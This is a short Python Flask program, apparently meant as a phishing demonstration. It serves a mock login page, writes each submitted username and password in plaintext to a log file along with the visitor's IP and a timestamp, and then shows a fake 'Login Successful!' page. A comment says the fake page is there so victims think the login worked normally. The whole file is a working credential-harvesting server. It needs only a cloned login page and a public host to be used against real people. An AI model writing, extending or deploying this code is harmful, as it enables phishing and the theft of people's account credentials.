from flask import Flask, request, render_template_string, redirect, url_for
import datetime
import os

app = Flask(__name__)
LOG_FILE = "login_data.txt"
LOGIN_PAGE = "login.html" # Assuming login.html is in the same directory

@app.route('/')
def serve_login():
    """
    Serves the mock login page (login.html) when the user navigates to the root URL.
    """
    try:
        with open(LOGIN_PAGE, 'r') as f:
            html_content = f.read()
        return render_template_string(html_content)
    except FileNotFoundError:
        return f"Error: {LOGIN_PAGE} not found. Ensure it is in the same directory as server.py", 404

@app.route('/login', methods=['POST'])
def capture_data():
    """
    Accepts the POST request from the form, logs the data, and redirects.
    """
    username = request.form.get('username')
    password = request.form.get('password')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Log the captured data to a local file
    log_entry = f"[{timestamp}] IP: {request.remote_addr}, USER: {username}, PASS: {password}\n"
    
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        
        print(f"\n[INFO] Successfully captured credentials: {username}")
        
    except Exception as e:
        print(f"\n[ERROR] Failed to write to log file: {e}")

    # After capturing, redirect the user to simulate a successful login or a real website
    # This simulates the attacker trying to make the victim think everything worked normally.
    return redirect(url_for('login_success'))

@app.route('/success')
def login_success():
    """
    A placeholder page to redirect the user to after submission.
    """
    return """
    <div style="text-align: center; margin-top: 100px; font-family: sans-serif;">
        <h1 style="color: #10B981;">Login Successful!</h1>
        <p>You have been redirected to the main dashboard.</p>
        <p style="color: #6B7280;">(In a real scenario, this would be the actual service's homepage.)</p>
    </div>
    """

if __name__ == '__main__':
    print("--- Starting Local Phishing Demonstration Server ---")
    print(f"Server URL: http://127.0.0.1:5000/")
    print(f"Captured data will be saved to: {LOG_FILE}")
    print("Press Ctrl+C to stop the server.")
    print("--------------------------------------------------")
    
    # Run the Flask app
    app.run(debug=False, port=5000)

